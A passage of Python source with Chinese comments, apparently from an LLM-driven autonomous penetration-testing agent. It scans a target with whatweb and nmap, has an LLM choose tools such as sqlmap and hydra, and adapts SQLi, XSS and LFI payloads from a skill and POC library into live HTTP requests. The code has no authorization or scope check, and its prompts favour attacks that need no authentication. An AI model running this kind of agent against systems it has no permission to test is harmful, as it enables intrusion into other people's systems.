    import traceback as _tb

    from state.progress_tracker import get_progress_tracker
    from agents.recon_agent import HexStrikeClient
    from agents.skill_loader import get_skill_loader

    tracker = get_progress_tracker()
    print(f"[standalone] Task {task_id[:12]} STARTED for {target}", flush=True)

    client = HexStrikeClient()
    llm = get_llm()

    skill_loader = None
    try:
        skill_loader = get_skill_loader()
    except Exception as e:
        print(f"[standalone] Skill loader 不可用: {e}")

    rag = None
    try:
        from rag.query_interface import get_rag_interface
        rag = get_rag_interface()
    except Exception as e:
        print(f"[standalone] RAG 不可用 (功能降级): {e}")

    attack_types = []
    if intent_info and isinstance(intent_info, dict):
        attack_types = intent_info.get("attack_types", [])
    if not attack_types and intent:
        attack_types = _infer_attack_types(intent)

    state = {
        "task_id": task_id, "target": target, "intent": intent,
        "user_message": user_message, "attack_types": attack_types,
        "iteration": 0, "tech_stack": [], "open_ports": [],
        "findings": [], "tried_skills": set(), "tried_tools": set(),
        "tool_calls": [], "rag_results": [], "poc_results": [],
    }

    tracker.update_phase(task_id, "init", "开始分析", f"目标: {target}, 意图: {intent}")
    tracker.update_phase(task_id, "init", "初始侦察", "正在收集目标基础信息...")

    whatweb_result = client.execute_command(f"whatweb {target}", category="web_security")
    tech_stack = _parse_tech_stack(whatweb_result)
    state["tech_stack"] = tech_stack

    # 如果 whatweb 未识别到技术栈，尝试 HTTP 直连获取响应头
    if not tech_stack and target.startswith("http"):
        print(f"[standalone] whatweb 未识别技术栈，尝试 curl 直连...")
        curl_result = client.execute_command(
            f"curl -sI -m 10 {target} 2>&1",
            category="web_security"
        )
        curl_stdout = curl_result.get("stdout", "") if curl_result.get("success") else ""
        server_match = re.search(r'(?i)^Server:\s*(.+)$', curl_stdout, re.MULTILINE)
        powered_match = re.search(r'(?i)^X-Powered-By:\s*(.+)$', curl_stdout, re.MULTILINE)
        if server_match:
            tech_stack.append(server_match.group(1).strip())
        if powered_match:
            tech_stack.append(powered_match.group(1).strip())
        if curl_stdout and "HTTP/" in curl_stdout:
            if "vite" in curl_stdout.lower() or "vue" in curl_stdout.lower():
                tech_stack.append("vite")
            if "webpack" in curl_stdout.lower() or "react" in curl_stdout.lower():
                tech_stack.append("webpack")
        state["tech_stack"] = tech_stack

    nmap_result = client.execute_command(f"nmap -F --top-ports 100 {target}", category="network")
    if nmap_result.get("success"):
        open_ports = re.findall(r'(\d+)/open', nmap_result.get("stdout", ""))
        state["open_ports"] = open_ports

    # ── 智能技能匹配 ──
    matched_skills = []
    if skill_loader:
        # 构建目标信息用于技能匹配
        target_info = {
            "url": target,
            "tech": tech_stack,
            "open_ports": [int(p) for p in state["open_ports"]] if state["open_ports"] else [],
            "headers": {},
            "keywords": _extract_keywords_from_intent(intent),
        }
        matched = skill_loader.match_skills(target_info)

        # 取 top 10 匹配技能，附上描述
        for m in matched[:10]:
            matched_skills.append({
                "name": m["name"],
                "description": m.get("description", "")[:120],
                "score": m.get("score", 0),
                "reasons": m.get("reasons", []),
            })

        # 如果没有匹配到任何技能，对 Web 目标使用通用 Web 攻击技能
        if not matched_skills and target.startswith("http"):
            all_skill_names = skill_loader.list_skills()
            # 通用 Web 攻击技能关键词
            generic_web_keywords = [
                "sqli", "xss", "lfi", "rfi", "csrf", "ssrf", "cors",
                "file-upload", "path-traversal", "command-injection",
                "weak-password", "default-creds", "dir-brute",
                "web", "http", "injection", "bypass", "auth", "api",
            ]
            fallback_skills = []
            for name in all_skill_names:
                name_lower = name.lower()
                for kw in generic_web_keywords:
                    if kw in name_lower:
                        fallback_skills.append({
                            "name": name,
                            "description": skill_loader.get_skill_description(name)[:120],
                            "score": 1,
                            "reasons": ["Web目标通用匹配"],
                        })
                        break
                if len(fallback_skills) >= 10:
                    break
            matched_skills = fallback_skills
            if matched_skills:
                print(f"[standalone] 通用 Web 匹配: {len(matched_skills)} 个技能")

        if matched_skills:
            names = [s["name"] for s in matched_skills[:5]]
            tracker.update_phase(
                task_id, "init", "POC匹配",
                f"知识库匹配到 {len(matched_skills)} 条相关技能: {', '.join(names)}",
                reasoning="基于技术栈、端口和意图自动匹配攻击技能"
            )
        else:
            tracker.update_phase(
                task_id, "init", "POC匹配",
                "未匹配到特定技能，将使用通用扫描策略",
                reasoning="无足够信息进行精准匹配"
            )

    tracker.update_phase(
        task_id, "init", "初始侦察完成",
        f"技术栈: {', '.join(tech_stack) if tech_stack else '未知'} | 开放端口: {len(state['open_ports'])} 个",
        reasoning="whatweb 和 nmap 扫描完成"
    )

    # 存储匹配的技能供 ReAct 循环使用
    state["matched_skills"] = matched_skills
    all_skills = skill_loader.list_skills() if skill_loader else []
    max_iterations = 8
    state["consecutive_tool_failures"] = 0

    while state["iteration"] < max_iterations:
        state["iteration"] += 1
        tracker.update_phase(task_id, "recon", f"🤔 AI 思考 #{state['iteration']}", "正在分析当前状态，决策下一步行动...")
        decision = _llm_decide_next_action(llm, state, all_skills, matched_skills)
        action = decision.get("action", "complete")
        reasoning = decision.get("reasoning", "")

        if action == "complete":
            tracker.update_phase(task_id, "recon", "AI 决策完成", f"判断测试已完成: {reasoning}", reasoning=reasoning)
            break

        tracker.update_phase(
            task_id, "recon", f"⚡ 执行: {action}", reasoning,
            reasoning=reasoning, tool=decision.get("tool") or "",
            command=str(decision.get("command") or "")[:100]
        )

        result = _execute_react_action(client, rag, skill_loader, decision, state)
        state["findings"].extend(result.get("findings", []))
        state["tried_skills"].update(result.get("tried_skills", []))
        state["tried_tools"].update(result.get("tried_tools", []))
        state["rag_results"].extend(result.get("rag_results", []))
        state["poc_results"].extend(result.get("poc_results", []))

        # 跟踪连续工具失败次数
        has_success = any(f.get("success") for f in result.get("findings", []))
        has_findings = len(result.get("findings", [])) > 0
        if has_findings and not has_success:
            state["consecutive_tool_failures"] = state.get("consecutive_tool_failures", 0) + 1
        elif has_success:
            state["consecutive_tool_failures"] = 0

        findings_count = len(result.get("findings", []))
        tracker.update_phase(task_id, "recon", "👁️ 观察结果",
                             f"本次行动发现 {findings_count} 个结果",
                             reasoning=result.get("summary", ""))

    total_findings = len(state["findings"])
    tracker.update_phase(task_id, "complete", "任务完成",
                         f"ReAct 循环结束，共 {state['iteration']} 轮迭代，发现 {total_findings} 个结果")

    # ── 生成报告文件 ──
    report_md = None
    report_json = None
    try:
        report_md, report_json = _generate_report_files(
            task_id, target, state, tracker
        )
    except Exception as e:
        print(f"[standalone] 报告生成失败: {e}")

    tracker.complete_task(task_id, "ReAct 循环完成")

    print(f"[standalone] Task {task_id[:12]} COMPLETED: {state['iteration']} iterations, {total_findings} findings", flush=True)
    return {
        "task_id": task_id, "status": "success", "phase": phase,
        "target": target, "findings": state["findings"],
        "tech_stack": state["tech_stack"], "open_ports": state["open_ports"],
        "iterations": state["iteration"],
        "report_md": report_md,
        "report_json": report_json,
    }


def _parse_tech_stack(whatweb_result: dict) -> list:
    """解析技术栈"""
    tech = []
    if whatweb_result.get("success"):
        output = whatweb_result.get("stdout", "")
        keywords = ["Apache", "nginx", "PHP", "MySQL", "WordPress", "Django", "React", "Vue", "jQuery",
                     "Tomcat", "IIS", "OpenSSL", "Cloudflare", "AWS", "jQuery", "Bootstrap"]
        for kw in keywords:
            if kw.lower() in output.lower():
                tech.append(kw)
    return tech


def _infer_attack_types(intent: str) -> list:
    """从 intent 字符串推断攻击类型列表"""
    mapping = {
        "recon": ["recon", "port_scan"],
        "port": ["recon", "port_scan"],
        "sqli": ["sqli"],
        "sql": ["sqli"],
        "xss": ["xss"],
        "rce": ["rce"],
        "lfi": ["lfi"],
        "ssrf": ["ssrf"],
        "csrf": ["csrf"],
        "cors": ["cors"],
        "brute": ["auth_bypass"],
        "auth": ["auth_bypass"],
        "vuln": ["vuln_scan"],
        "scan": ["vuln_scan"],
        "rag": ["rag_query"],
        "poc": ["rag_query"],
        "漏洞": ["rag_query"],
        "full": ["full_pentest"],
        "pentest": ["full_pentest"],
        "渗透": ["full_pentest"],
    }

    intent_lower = intent.lower()
    attack_types = []
    for keyword, types in mapping.items():
        if keyword in intent_lower:
            attack_types.extend(types)

    return list(set(attack_types)) if attack_types else ["full_pentest"]


def _extract_keywords_from_intent(intent: str) -> list:
    """从用户意图中提取关键词，用于技能匹配"""
    keywords = []
    intent_lower = intent.lower()

    keyword_map = {
        "sql": ["sql", "sqli", "injection", "database"],
        "xss": ["xss", "cross-site", "script"],
        "rce": ["rce", "command", "exec", "code execution"],
        "lfi": ["lfi", "file inclusion", "path traversal", "directory traversal"],
        "ssrf": ["ssrf", "server-side request"],
        "csrf": ["csrf", "cross-site request"],
        "auth": ["login", "auth", "signin", "password", "credential", "弱密码", "弱口令"],
        "upload": ["upload", "file upload"],
        "api": ["api", "rest", "graphql", "endpoint"],
        "admin": ["admin", "dashboard", "console", "管理"],
        "config": ["config", "env", "setting", "backup"],
        "port": ["port", "端口", "scan"],
        "dir": ["dir", "directory", "目录", "path"],
        "vuln": ["漏洞", "vulnerability", "cve", "exploit"],
    }

    for category, kws in keyword_map.items():
        for kw in kws:
            if kw in intent_lower:
                keywords.append(kw)
                break  # 每个类别只取一个

    # 对于渗透测试/扫描等通用意图，添加通用 Web 关键词确保能匹配到技能
    generic_intents = ["渗透", "pentest", "扫描", "测试", "漏洞", "攻击"]
    is_generic = any(gi in intent_lower for gi in generic_intents)
    if is_generic and len(keywords) < 2:
        # 添加默认 Web 安全关键词
        if "sql" not in intent_lower:
            keywords.append("sql")
        if "xss" not in intent_lower:
            keywords.append("xss")

    return list(set(keywords))


def _llm_decide_next_action(llm, state: dict, all_skills: list, matched_skills: list = None) -> dict:
    """
    LLM 驱动的决策引擎 - 根据当前状态决定下一步行动

    这是 ReAct 循环的核心：每一步都由 LLM 分析状态并决策。
    matched_skills 是从 skill_loader.match_skills() 返回的智能匹配结果（含描述和评分）。
    """
    target = state["target"]
    intent = state.get("intent", "")
    tech_stack = state.get("tech_stack", [])
    open_ports = state.get("open_ports", [])
    findings = state.get("findings", [])
    tried_skills = list(state.get("tried_skills", set()))
    tried_tools = list(state.get("tried_tools", set()))
    rag_results = state.get("rag_results", [])
    iteration = state.get("iteration", 0)
    consecutive_tool_failures = state.get("consecutive_tool_failures", 0)
    matched_skills = matched_skills or state.get("matched_skills", [])

    # 构建已发现信息摘要
    findings_summary = ""
    for f in findings[-5:]:
        findings_summary += f"- {f.get('type', 'unknown')}: {f.get('name', f.get('output', '')[:80])}\n"

    # ── 构建技能展示区（这是核心改进） ──

    # 1. 智能匹配的技能（高优先级，置顶展示）
    matched_skills_text = ""
    if matched_skills:
        matched_skills_text = "【🎯 智能匹配的攻击技能 — 优先使用】\n"
        for i, s in enumerate(matched_skills, 1):
            reasons = "、".join(s.get("reasons", [])) if s.get("reasons") else "通用匹配"
            matched_skills_text += f"  {i}. {s['name']} — {s.get('description', '')} (匹配原因: {reasons})\n"
        # 过滤掉已匹配的技能名，避免在"其他可用"中重复
        matched_names = {s["name"] for s in matched_skills}
        available_skills = [s for s in all_skills if s not in tried_skills and s not in matched_names][:15]
        matched_skills_text += "\n"
    else:
        available_skills = [s for s in all_skills if s not in tried_skills][:15]

    # 2. 其他可用技能（降级选择）
    other_skills_text = ""
    if available_skills:
        other_skills_text = f"【📋 其他可用技能 ({len(available_skills)} 个)】\n"
        other_skills_text += ", ".join(available_skills)

    # 3. 工具失败警告
    failure_warning = ""
    if consecutive_tool_failures >= 2:
        failure_warning = f"""
⚠️ 【警告】已连续 {consecutive_tool_failures} 次工具执行失败！
请不要再尝试相同的工具调用。改用 execute_skill 尝试匹配的攻击技能。"""

    # 构建 RAG 结果摘要
    rag_summary = ""
    for r in rag_results[-3:]:
        rag_summary += f"- {r.get('name', 'unknown')} (CVE: {r.get('cve', 'N/A')}, 相似度: {r.get('similarity', 0):.2f})\n"

    system_prompt = """你是一个专业的Hati（渗透测试智能体）。根据当前状态，决策下一步行动。

【可用行动类型】
1. execute_tool - 调用 HexStrike MCP 工具执行命令
   - 可用工具: nmap, sqlmap, nikto, nuclei, ffuf, dirb, subfinder, httpx, hydra, whatweb, masscan 等
   - 必须指定完整的命令

2. execute_skill - 执行攻击技能（当有匹配技能时优先选择）
   - 从「智能匹配的攻击技能」列表中选择
   - 技能包含详细的攻击方法、payload 和验证步骤
   - ⚠️ 当 execute_tool 连续失败时，必须改用 execute_skill

3. query_rag - 查询 RAG POC 知识库
   - 根据技术栈和发现的漏洞查询相关 POC

4. generate_poc - 基于已发现的信息生成 POC 并验证
   - 当有足够信息时，生成针对性的 POC

5. complete - 判断测试已完成（仅在尝试了多种攻击向量后使用）

【端口扫描策略 - 必须严格遵循】
⚠️ 严禁单次扫描对全端口做服务探测，必须分阶段：

第一阶段（快速发现开放端口，1-2分钟）：
  nmap -F -sV --version-intensity 3 {target}
  或 masscan -p1-65535 {target} --rate=2000

第二阶段（精准深扫，仅针对已发现的开放端口）：
  nmap -sV -sC -p <已发现端口列表> {target}

禁止的命令（极慢，不可接受）：
  ❌ nmap -sV -p 1-10000       （10000端口逐个服务探测）
  ❌ nmap -sV -p-              （65535端口逐个服务探测）
  ❌ nmap -sV -sC -p 1-10000   （加脚本扫描更慢）

正确做法：
  ① masscan 或 nmap -F 先快速发现开放端口
  ② 根据发现的端口，用 nmap -sV -sC -p 80,443,... 针对性深扫

【决策原则】
- 🎯 最优先：使用「智能匹配的攻击技能」进行攻击（匹配度越高越优先）
- 如果匹配技能列表非空，至少尝试其中评分最高的 2-3 个
- 信息收集只需做一次，不要反复扫描
- 执行工具失败 2 次后，立即转向 execute_skill
- 发现漏洞后尝试深入验证
- 考虑技术栈特点选择攻击方法

【返回格式】严格返回 JSON：
{
    "action": "行动类型",
    "reasoning": "为什么选择这个行动",
    "tool": "工具名（execute_tool时）",
    "command": "完整命令（execute_tool时）",
    "skill_name": "技能名（execute_skill时，从匹配技能列表中选择）",
    "query": "查询词（query_rag时）"
}"""

    user_prompt = f"""## 当前状态
- 目标: {target}
- 用户意图: {intent}
- 技术栈: {', '.join(tech_stack) if tech_stack else '未知'}
- 开放端口: {', '.join(open_ports) if open_ports else '未知'}
- 当前迭代: 第 {iteration} 轮 / 共 8 轮
- 连续工具失败: {consecutive_tool_failures} 次

## 已发现信息
{findings_summary if findings_summary else '暂无'}

## 已尝试的技能: {', '.join(tried_skills) if tried_skills else '无'}
## 已尝试的工具: {', '.join(tried_tools) if tried_tools else '无'}

## RAG 查询结果
{rag_summary if rag_summary else '暂未查询'}

{matched_skills_text}
{other_skills_text}
{failure_warning}

请决策下一步行动。"""

    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = llm.chat(prompt=user_prompt, system_prompt=system_prompt)
            decision = _parse_json_response(response)

            # 验证返回格式
            if "action" not in decision:
                decision = {"action": "complete", "reasoning": "LLM 返回格式错误，默认完成"}

            return decision

        except Exception as e:
            print(f"[ReAct] LLM 决策失败 (尝试 {attempt+1}/{max_retries}): {e}")
            if attempt < max_retries - 1:
                import time
                time.sleep(3)
            else:
                # 如果有匹配技能未使用，引导使用技能
                untried_matched = [s for s in matched_skills if s["name"] not in tried_skills]
                if untried_matched:
                    skill_name = untried_matched[0]["name"]
                    print(f"[ReAct] LLM 重试失败，使用匹配技能: {skill_name}")
                    return {
                        "action": "execute_skill",
                        "reasoning": f"LLM 连接失败，使用智能匹配技能 {skill_name} 继续",
                        "skill_name": skill_name,
                    }
                else:
                    print(f"[ReAct] LLM 重试失败，使用默认工具继续...")
                    return {
                        "action": "execute_tool",
                        "reasoning": f"LLM 连接失败，使用默认 nmap 扫描继续",
                        "tool": "nmap",
                        "command": f"nmap -F -sV --version-intensity 3 {target}"
                    }


def _parse_json_response(response: str) -> dict:
    """解析 LLM 返回的 JSON"""
    # 尝试提取 JSON
    json_match = re.search(r'\{.*\}', response, re.DOTALL)
    if json_match:
        try:
            return json.loads(json_match.group())
        except json.JSONDecodeError:
            pass

    # 如果没有有效 JSON，尝试从文本推断
    response_lower = response.lower()
    if "complete" in response_lower or "完成" in response_lower:
        return {"action": "complete", "reasoning": response[:200]}
    elif "execute_skill" in response_lower or "skill" in response_lower:
        # 尝试提取技能名
        skill_match = re.search(r'"skill_name"\s*:\s*"([^"]+)"', response)
        skill_name = skill_match.group(1) if skill_match else ""
        return {"action": "execute_skill", "reasoning": response[:200], "skill_name": skill_name}
    elif "tool" in response_lower or "nmap" in response_lower or "sqlmap" in response_lower:
        return {"action": "execute_tool", "reasoning": response[:200], "command": response[:200]}
    elif "query_rag" in response_lower or "rag" in response_lower:
        return {"action": "query_rag", "reasoning": response[:200], "query": response[:200]}
    else:
        return {"action": "complete", "reasoning": "无法解析响应"}


def _execute_react_action(client, rag, skill_loader, decision: dict, state: dict) -> dict:
    """
    执行 LLM 决策的行动

    Args:
        client: HexStrikeClient
        rag: RAG interface
        skill_loader: SkillLoader
        decision: LLM 的决策
        state: 当前状态

    Returns:
        执行结果
    """
    action = decision.get("action", "")
    target = state["target"]

    findings = []
    tried_skills = set()
    tried_tools = set()
    rag_results = []
    poc_results = []
    summary = ""

    if action == "execute_tool":
        # 调用 HexStrike 工具
        tool = decision.get("tool", "")
        command = decision.get("command", "")

        if not command:
            return {"findings": [], "summary": "未指定命令"}

        # 替换目标占位符
        command = command.replace("{target}", target)

        # 记录尝试的工具
        tried_tools.add(tool)

        try:
            result = client.execute_command(command, category=_get_category_for_tool(tool))

            if result.get("success"):
                output = result.get("stdout", "")
                findings.append({
                    "type": "tool",
                    "tool": tool,
                    "command": command,
                    "output": output[:2000],
                    "success": True,
                })
                summary = f"{tool} 执行成功，输出 {len(output)} 字符"
            else:
                # httpx 失败时自动降级为 curl
                error = result.get("error", "未知错误")
                if "httpx" in tool.lower() and target.startswith("http"):
                    print(f"[ReAct] httpx 失败，降级为 curl: {error[:80]}")
                    curl_cmd = f"curl -sI -m 10 {target}"
                    fallback_result = client.execute_command(curl_cmd, category="web_security")
                    if fallback_result.get("success"):
                        output = fallback_result.get("stdout", "")
                        findings.append({
                            "type": "tool",
                            "tool": "curl (httpx降级)",
                            "command": curl_cmd,
                            "output": output[:2000],
                            "success": True,
                        })
                        summary = f"httpx 降级为 curl 成功，输出 {len(output)} 字符"
                    else:
                        findings.append({
                            "type": "tool",
                            "tool": tool,
                            "command": command,
                            "error": error,
                            "success": False,
                        })
                        summary = f"{tool} 和 curl 均失败: {error[:80]}"
                else:
                    findings.append({
                        "type": "tool",
                        "tool": tool,
                        "command": command,
                        "error": error,
                        "success": False,
                    })
                    summary = f"{tool} 执行失败: {error[:100]}"
        except Exception as e:
            findings.append({
                "type": "tool",
                "tool": tool,
                "command": command,
                "error": str(e),
                "success": False,
            })
            summary = f"{tool} 执行异常: {str(e)[:100]}"

    elif action == "execute_skill":
        # 执行 hack-skill — 从技能内容提取 HTTP POC 请求并直接发包验证
        skill_name = decision.get("skill_name", "")

        if not skill_name:
            return {"findings": [], "summary": "未指定技能名"}

        # 获取技能内容
        if skill_loader is None:
            return {"findings": [], "summary": "技能加载器不可用"}
        skill_content = skill_loader.get_skill_content(skill_name)
        if not skill_content:
            return {"findings": [], "summary": f"技能 {skill_name} 不存在"}

        # 记录尝试的技能
        tried_skills.add(skill_name)

        # 使用 LLM 从技能内容中提取 HTTP POC 请求（适配到目标）
        llm = get_llm()
        poc_requests = _llm_adapt_skill_to_target(llm, skill_name, skill_content, target, state)

        if poc_requests:
            import requests as _req
            import urllib3 as _urllib3
            _urllib3.disable_warnings()

            for poc in poc_requests:
                method = poc.get("method", "GET").upper()
                path = poc.get("path", "/")
                headers = poc.get("headers", {}) or {}
                body = poc.get("body", "")
                vulnerability = poc.get("vulnerability", skill_name)
                indicator = poc.get("success_indicator", "")

                # 构造完整 URL
                full_url = path if path.startswith("http") else f"{target.rstrip('/')}/{path.lstrip('/')}"

                try:
                    if method == "GET":
                        resp = _req.get(full_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
                    else:
                        resp = _req.post(full_url, headers=headers, data=body, timeout=15, verify=False, allow_redirects=True)

                    # 验证漏洞是否存在
                    vuln_confirmed = False
                    if indicator:
                        vuln_confirmed = indicator.lower() in resp.text.lower()

                    findings.append({
                        "type": "skill_poc",
                        "skill": skill_name,
                        "vulnerability": vulnerability,
                        "method": method,
                        "url": full_url,
                        "status_code": resp.status_code,
                        "vuln_confirmed": vuln_confirmed,
                        "indicator": indicator[:100],
                        "response_preview": resp.text[:500],
                        "success": True,
                    })
                    status = "漏洞确认!" if vuln_confirmed else "未确认漏洞"
                    summary = f"技能 {skill_name} POC {method} {full_url} → {resp.status_code} [{status}]"
                except Exception as e:
                    findings.append({
                        "type": "skill_poc",
                        "skill": skill_name,
                        "vulnerability": vulnerability,
                        "method": method,
                        "url": full_url,
                        "error": str(e),
                        "success": False,
                    })
                    summary = f"技能 {skill_name} POC 请求失败: {str(e)[:100]}"
        else:
            summary = f"技能 {skill_name} 未生成可执行的 POC 请求"

    elif action == "query_rag":
        # 查询 RAG POC 知识库并自动链入 POC 验证
        query = decision.get("query", "")

        if not query:
            # 使用默认查询
            query = f"{target} {' '.join(state.get('tech_stack', []))}"

        try:
            if rag is not None:
                results = rag.query(query, n_results=5)
                for vuln in results.vulnerabilities[:5]:
                    rag_results.append({
                        "type": "rag",
                        "name": vuln.name,
                        "cve": getattr(vuln, 'cve_id', ""),
                        "severity": getattr(vuln, 'severity', "unknown"),
                        "similarity": getattr(vuln, 'similarity', 0),
                        "poc_content": getattr(vuln, 'poc_content', "")[:500],
                    })
                summary = f"RAG 查询 '{query}' 返回 {len(rag_results)} 个结果"

                # 自动链入 POC 验证：使用 RAG 真实 POC 内容发包测试
                if rag_results:
                    llm = get_llm()
                    verified = _llm_adapt_and_test_poc(llm, target, state, rag_results)
                    for pr in verified:
                        poc_results.append(pr)
                        findings.append({
                            "type": "poc_verified",
                            "cve": pr.get("cve", ""),
                            "vulnerability": pr.get("vulnerability", ""),
                            "vuln_confirmed": pr.get("vuln_confirmed", False),
                            "verification": pr.get("verification", ""),
                            "status_code": pr.get("status_code", 0),
                        })
                        if pr.get("vuln_confirmed"):
                            summary += f"\n⚠️ 确认漏洞: {pr.get('vulnerability', '')}!"
            else:
                summary = f"RAG 不可用，跳过查询"
                rag_results.append({"type": "info", "name": "RAG 未初始化"})
        except Exception as e:
            summary = f"RAG 查询失败: {str(e)[:100]}"

    elif action == "generate_poc":
        # 使用 RAG 结果 + LLM 适配生成 POC 并验证
        llm = get_llm()

        # 收集所有 RAG 结果（当前步骤 + 之前迭代积累的）
        all_rag = list(rag_results) + list(state.get("rag_results", []))
        for f in state.get("findings", []):
            if f.get("type") == "rag" and f not in all_rag:
                all_rag.append(f)

        if all_rag:
            verified = _llm_adapt_and_test_poc(llm, target, state, all_rag)
            for pr in verified:
                poc_results.append(pr)
                findings.append({
                    "type": "poc_verified",
                    "cve": pr.get("cve", ""),
                    "vulnerability": pr.get("vulnerability", ""),
                    "vuln_confirmed": pr.get("vuln_confirmed", False),
                    "verification": pr.get("verification", ""),
                    "status_code": pr.get("status_code", 0),
                })
            confirmed = [p for p in verified if p.get("vuln_confirmed")]
            if confirmed:
                summary = f"POC 验证完成，确认 {len(confirmed)} 个漏洞: {', '.join(p.get('vulnerability','') for p in confirmed)}"
            else:
                summary = f"POC 验证完成，共测试 {len(all_rag)} 个 POC，未确认漏洞"
        else:
            summary = "无 RAG 结果可用于 POC 生成"

    elif action == "complete":
        summary = "LLM 判断测试完成"

    else:
        summary = f"未知行动类型: {action}"

    return {
        "findings": findings,
        "tried_skills": tried_skills,
        "tried_tools": tried_tools,
        "rag_results": rag_results,
        "poc_results": poc_results,
        "summary": summary,
    }


def _llm_adapt_skill_to_target(llm, skill_name: str, skill_content: str, target: str, state: dict) -> list:
    """LLM 从技能内容中提取攻击 payload，适配到具体目标，生成可执行的 HTTP POC 请求列表"""
    tech_stack = state.get("tech_stack", [])
    open_ports = state.get("open_ports", [])
    findings_summary = ""
    for f in state.get("findings", [])[-3:]:
        findings_summary += f"- {f.get('type', '')}: {str(f.get('output', ''))[:100]}\n"

    prompt = f"""你是渗透测试专家。以下是一个攻击技能的完整知识，请从中提取具体的攻击 payload，并针对目标生成 HTTP 请求来验证漏洞。

## 技能名称: {skill_name}
## 技能内容:
{skill_content[:3000]}

## 目标信息
- URL: {target}
- 技术栈: {', '.join(tech_stack) if tech_stack else '未知'}
- 开放端口: {', '.join(open_ports) if open_ports else '未知'}
- 已有发现: {findings_summary if findings_summary else '暂无'}

## 要求
1. 从技能内容中提取 1-3 个最相关的攻击 payload
2. 根据目标的实际 URL/端口/技术栈，调整 payload（不能直接照搬，要适配目标）
3. 为每个 payload 生成具体的 HTTP 请求
4. 指定判断漏洞是否存在的响应特征

返回 JSON 数组（严格遵守格式）：
[
    {{
        "vulnerability": "漏洞类型（如 SQL Injection, XSS, LFI 等）",
        "method": "GET 或 POST",
        "path": "请求路径（如 /login.php?id=PAYLOAD）",
        "headers": {{"Content-Type": "application/x-www-form-urlencoded"}},
        "body": "POST 请求体，GET 时为空",
        "success_indicator": "响应中判断漏洞存在的特征（如 SQL syntax error, mysql_fetch 等）",
        "skill_reference": "来自技能的哪个部分（payload名/步骤名）"
    }}
]

注意：
- payload 要适配 {target} 的实际环境
- 如果没有足够信息构造完整 URL，至少基于目标根路径尝试
- 优先选择不需要认证即可触发的 payload"""

    try:
        response = llm.chat(prompt=prompt,
            system_prompt="你是渗透测试专家。只返回有效的 JSON 数组。每个元素是一个可执行的 POC 请求。")
        # 尝试解析 JSON 数组
        json_match = re.search(r'\[.*\]', response, re.DOTALL)
        if json_match:
            poc_list = json.loads(json_match.group())
            if isinstance(poc_list, list) and len(poc_list) > 0:
                print(f"[ReAct] 技能 {skill_name} 生成 {len(poc_list)} 个 POC 请求")
                return poc_list
        # 回退：尝试解析单个对象
        decision = _parse_json_response(response)
        if decision.get("url") or decision.get("path"):
            return [decision]
        return []
    except Exception as e:
        print(f"[ReAct] 技能 POC 生成失败: {e}")
        return []


def _llm_adapt_and_test_poc(llm, target: str, state: dict, rag_results: list) -> list:
    """使用 RAG 返回的真实 POC 内容，LLM 适配到目标后发包验证。返回验证结果列表。"""
    import requests as req
    import urllib3
    urllib3.disable_warnings()

    results = []
    tech_stack = state.get("tech_stack", [])
    open_ports = state.get("open_ports", [])

    for rag_item in rag_results:
        cve = rag_item.get("cve", "")
        vuln_name = rag_item.get("name", "")
        poc_content = rag_item.get("poc_content", "")
        similarity = rag_item.get("similarity", 0)

        if not poc_content or len(poc_content) < 20:
            continue

        # LLM 基于真实 POC 内容 + 目标信息，生成适配的 HTTP 请求
        prompt = f"""你是渗透测试专家。以下是知识库中匹配到的真实 POC 内容。请根据目标信息调整 POC，生成一个可直接发送的 HTTP 请求。

## RAG 匹配的 POC
CVE/名称: {cve or vuln_name}
相似度: {similarity}
POC 内容:
```
{poc_content[:2000]}
```

## 目标信息
- URL: {target}
- 技术栈: {', '.join(tech_stack) if tech_stack else '未知'}
- 开放端口: {', '.join(open_ports) if open_ports else '未知'}

## 要求
1. 不要直接照搬 POC 内容，要根据目标的实际情况调整 URL、参数、Header
2. 如果 POC 中的路径/参数在目标上不存在，构造合理的替代
3. 生成一个具体的 HTTP 请求

返回 JSON：
{{
    "vulnerability": "漏洞类型和 CVE 编号",
    "method": "GET 或 POST",
    "url": "完整请求 URL（基于 {target} 构造）",
    "headers": {{}},
    "body": "POST 请求体",
    "success_indicator": "响应中判断漏洞存在的特征字符串",
    "adaptation_note": "说明做了什么适配调整"
}}"""

        try:
            response = llm.chat(prompt=prompt,
                system_prompt="你是渗透测试专家。基于真实 POC 和实际目标信息生成验证请求。只返回 JSON。")
            poc_config = _parse_json_response(response)

            if not poc_config.get("url"):
                continue

            # 发送 POC 请求
            method = poc_config.get("method", "GET").upper()
            url = poc_config.get("url", "").replace("{target}", target)
            headers = poc_config.get("headers", {}) or {}
            body = poc_config.get("body", "")

            print(f"[ReAct] POC 验证: {method} {url[:120]}", flush=True)

            try:
                if method == "GET":
                    resp = req.get(url, headers=headers, timeout=15, verify=False, allow_redirects=True)
                else:
                    resp = req.post(url, headers=headers, data=body, timeout=15, verify=False, allow_redirects=True)

                # 验证漏洞是否存在
                indicator = poc_config.get("success_indicator", "")
                vuln_confirmed = False
                verification_detail = ""

                if indicator:
                    vuln_confirmed = indicator.lower() in resp.text.lower()
                    verification_detail = f"特征'{indicator[:50]}'在响应中{'发现' if vuln_confirmed else '未发现'}"

                # 常见漏洞类型推断验证
                if not indicator:
                    resp_lower = resp.text.lower()
                    if "sql" in vuln_name.lower() or "sqli" in vuln_name.lower():
                        sql_errors = ["sql syntax", "mysql_fetch", "sqlite3", "postgresql", "ora-", "unclosed quotation"]
                        for err in sql_errors:
                            if err in resp_lower:
                                vuln_confirmed = True
                                verification_detail = f"SQL 错误回显: {err}"
                                break
                    elif "xss" in vuln_name.lower():
                        if "<script>" in resp.text or "alert(" in resp.text or "onerror=" in resp.text:
                            vuln_confirmed = True
                            verification_detail = "XSS payload 在响应中原样回显"
                    elif "lfi" in vuln_name.lower() or "path traversal" in vuln_name.lower():
                        lfi_indicators = ["root:", "etc/passwd", "boot.ini", "<?php"]
                        for ind in lfi_indicators:
                            if ind in resp_lower:
                                vuln_confirmed = True
                                verification_detail = f"文件包含特征: {ind}"
                                break

                results.append({
                    "type": "poc_verified",
                    "cve": cve,
                    "vulnerability": poc_config.get("vulnerability", vuln_name),
                    "similarity": similarity,
                    "url": url,
                    "method": method,
                    "status_code": resp.status_code,
                    "vuln_confirmed": vuln_confirmed,
                    "verification": verification_detail,
                    "adaptation": poc_config.get("adaptation_note", ""),
                    "response_preview": resp.text[:300],
                    "success": True,  # HTTP 请求本身成功
                })
                status = "验证成功，漏洞存在!" if vuln_confirmed else "验证完成，未确认漏洞"
                print(f"[ReAct] POC {status}: {verification_detail}", flush=True)

